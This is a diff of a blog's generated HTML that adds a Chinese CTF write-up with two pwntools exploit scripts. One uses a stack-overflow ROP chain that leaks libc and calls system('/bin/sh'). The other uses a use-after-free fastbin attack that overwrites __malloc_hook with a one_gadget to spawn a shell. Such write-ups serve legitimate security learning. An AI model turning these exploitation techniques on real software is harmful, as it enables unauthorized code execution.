@@ -102,7 +102,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http:/2018/05/22/iscc-2018-pwn/" data-id="cjhl93ij8000047wi77ejpdfr" class="article-share-link">Share</a>
+      <a data-url="http:/2018/05/22/iscc-2018-pwn/" data-id="cjhlcb63z0000jywi7zlsfavh" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
@@ -117,7 +117,7 @@
     <article id="post-pwnable.tw" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/05/13/pwnable.tw/" class="article-date">
-  <time datetime="2018-05-13T11:13:36.000Z" itemprop="datePublished">2018-05-13</time>
+  <time datetime="2018-05-12T16:00:00.000Z" itemprop="datePublished">2018-05-13</time>
 </a>
     
   </div>
@@ -128,7 +128,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/13/pwnable.tw/">iscc 2018 pwn</a>
+      <a class="article-title" href="/2018/05/13/pwnable.tw/">pwnable.tw解题</a>
     </h1>
   
 
@@ -142,7 +142,49 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http:/2018/05/13/pwnable.tw/" data-id="cjhl93iji000147wi6jsn2vct" class="article-share-link">Share</a>
+      <a data-url="http:/2018/05/13/pwnable.tw/" data-id="cjhlcb64f0001jywilbeafnta" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-铁人三项赛个人赛writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/12/铁人三项赛个人赛writeup/" class="article-date">
+  <time datetime="2018-05-11T16:00:00.000Z" itemprop="datePublished">2018-05-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/12/铁人三项赛个人赛writeup/">铁人三项赛个人赛writeup</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="铁人三项赛个人赛writeup"><a href="#铁人三项赛个人赛writeup" class="headerlink" title="铁人三项赛个人赛writeup"></a>铁人三项赛个人赛writeup</h1><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>简单的栈溢出<br><img src="https://i.imgur.com/CQ5ISEJ.png" alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./rop'</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc32"</span>&#125;)</span><br><span class="line"><span class="comment">#P = remote('')</span></span><br><span class="line">elf = ELF(<span class="string">'./rop'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc32'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">140</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x0804855c</span>) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>)+ p32(<span class="number">0</span>) + p32(<span class="number">0x80484C6</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line">write_addr = read_addr - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = read_addr - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"></span><br><span class="line">pay = p32(elf.plt[<span class="string">'read'</span>]) + p32(<span class="number">0x0804855c</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x804A018</span>) + p32(<span class="number">0x8</span>) + p32(<span class="number">0</span>)</span><br><span class="line">pay += p32(system_addr) + <span class="string">'bbbb'</span> + p32(<span class="number">0x804A018</span>)</span><br><span class="line"><span class="comment">#write '/bin/sh' to bss ,call system get shell</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">140</span> + pay)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="breakfast"><a href="#breakfast" class="headerlink" title="breakfast"></a>breakfast</h2><p>删除操作处理不当未清空变量存在uaf<br><img src="https://i.imgur.com/658TNoj.png" alt=""><br>这write给的,就是用来的泄露的逻辑<br><img src="https://i.imgur.com/JwjjV48.png" alt=""><br>动态一调,果然会write我没所给的地址的值,用edit写地址即可泄露<br><img src="https://i.imgur.com/ySbzdBn.png" alt=""></p>
+<p>got表没有写权限就不能直接更改got表<br><img src="https://i.imgur.com/4p3iQ5d.png" alt=""><br><img src="https://i.imgur.com/5epjwhg.png" alt=""><br>可以更改_malloc_hook能够达到类似更改malloc got的功能<br>把free的fastbin的fd指向_malloc_hook旁边能够绕过fastbin检测的地方,edit写入内容覆盖到_malloc_hook的值,跳转到one_gadget,即可shell.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./breakfast'</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc64"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./breakfast'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.- Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'breakfast\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'kcal.\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,input)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.- Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'ingredients\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'ingredients\n'</span>)</span><br><span class="line">	p.sendline(input)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.- Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'see\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.- Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'delete\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)	</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = p64(elf.got[<span class="string">'read'</span>])</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">read_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#system_addr = offset + libc.symbols['system']</span></span><br><span class="line"><span class="comment">#print hex(system_addr)</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">fake = malloc_hook - <span class="number">0x28</span> + <span class="number">5</span></span><br><span class="line">payload = p64(fake)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#payload = 'k'*10</span></span><br><span class="line"><span class="comment">#edit(1,payload)</span></span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'h'</span> * (<span class="number">3</span>+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(libc_base + <span class="number">0xf1147</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http:/2018/05/12/铁人三项赛个人赛writeup/" data-id="cjhlcb64k0003jywin7its9ci" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
@@ -203,7 +245,11 @@
           </li>
         
           <li>
-            <a href="/2018/05/13/pwnable.tw/">iscc 2018 pwn</a>
+            <a href="/2018/05/13/pwnable.tw/">pwnable.tw解题</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/12/铁人三项赛个人赛writeup/">铁人三项赛个人赛writeup</a>
           </li>
         
       </ul>
